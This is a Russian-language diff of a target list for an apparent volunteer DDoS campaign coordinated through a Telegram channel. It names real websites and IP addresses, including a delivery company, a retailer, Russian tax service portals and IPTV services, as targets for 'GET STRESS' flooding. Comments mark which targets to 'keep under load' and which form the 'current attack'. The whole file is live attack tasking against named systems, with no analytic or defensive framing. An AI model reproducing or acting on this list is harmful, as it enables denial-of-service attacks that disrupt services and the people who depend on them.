@@ -1,8 +1,9 @@
 ### Цели выбираются и анонсируются в канале Украинский Жнец - https://t.me/+-GoGtA_IsOk3YmE6 чат - https://t.me/+sNy3N3b11_9mMDA6
 ### Не забываем, удалять все параметры: -t --rpc -p --debug. UDP в список не добавляем
 
-https://www.cdek.ru/ru https://cdek.by/ru/ tcp://78.46.28.63:80 tcp://78.46.28.63:443 tcp://195.189.222.41:443 tcp://195.189.222.60:993 --http-methods GET STRESS
+# Продолжаем держать под нагрузкой
+https://www.cdek.ru/ru https://cdek.by/ru/ https://leroymerlin.ru https://auth.leroymerlin.ru https://import.leroymerlin.ru https://adfs.leroymerlin.ru https://wfm.leroymerlin.ru https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ https://spravka-nalog.ru https://viza.spravka-nalog.ru --http-methods GET STRESS
 
-https://leroymerlin.ru https://auth.leroymerlin.ru https://import.leroymerlin.ru https://adfs.leroymerlin.ru https://wfm.leroymerlin.ru --http-methods GET STRESS
-
-https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ https://spravka-nalog.ru https://viza.spravka-nalog.ru tcp://213.24.64.138:443 tcp://213.24.64.104:443 tcp://81.176.235.2:443 tcp://213.24.64.94:443 tcp://87.242.70.127:443 tcp://90.156.242.130:443 --http-methods GET STRESS
+# Текущая атака
+# Атакуем IPTV-сервисы! 
+https://wink.ru tcp://212.193.155.253:80 tcp://212.193.155.253:443 tcp://37.220.163.158:80 tcp://37.220.163.158:443 tcp://212.193.153.139:443 tcp://87.226.155.212:80 tcp://87.226.155.212:443 --http-methods GET STRESS
